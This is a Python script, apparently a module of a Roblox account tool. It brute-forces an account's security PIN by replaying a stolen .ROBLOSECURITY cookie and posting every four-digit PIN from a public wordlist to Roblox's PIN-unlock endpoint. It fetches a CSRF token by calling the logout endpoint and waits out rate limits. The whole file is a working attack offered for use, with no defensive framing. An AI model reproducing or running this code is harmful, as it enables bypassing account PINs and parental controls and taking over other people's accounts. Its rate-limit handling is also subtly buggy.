import aiohttp
import asyncio
import traceback
import requests

from src import cprint, csrf

async def start(self):
    try:
        self.display_theme(1)
        choice = cprint.user_input("This process might take a while to finish, are you sure you want to continue? (y/N) > ")
        if choice in ["yes", "y"]:
            async with aiohttp.ClientSession(cookies={".ROBLOSECURITY": self.cookie}) as session:
                pins = await get_pins(session)
                for pin in pins:
                    xcsrf = getXsrf(self.cookie)
                    session.headers.update({"X-Csrf-Token": xcsrf})
                    cprint.info(f"Trying pin: {pin}")
                    resp = await crack(session, pin)

                    if resp == 1:
                        break


    except Exception:
        traceback.print_exc()

async def crack(session, pin):
    while True:
        async with session.post("https://auth.roblox.com/v1/account/pin/unlock", data={"pin":f"{pin}"}) as response:
            if response.status == 200:
                cprint.custom(f"Pin found: {pin}", "SUCCESS", (0,255,0))
                return 1

            if response.status == 403:
                cprint.custom(f"Incorrect pin", "FAILED", (255,0,0))
                return 2

            if response.status == 429:
                cprint.error("Rate limit, waiting 10 minutes.")
                await asyncio.sleep(600)

            else:
                cprint.error(f"Unknown error: {response.text}")
                return None

async def get_pins(session):
    async with session.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv", cookies=None) as response:
        if response.status == 200:
            data = await response.text()
            data = data.splitlines()
            pins = [pin[0:pin.index(",")] for pin in data]
            return pins
        
def getXsrf(cookie):
    xsrfRequest = requests.post("https://auth.roblox.com/v2/logout", cookies={'.ROBLOSECURITY': cookie})
    return xsrfRequest.headers["x-csrf-token"]

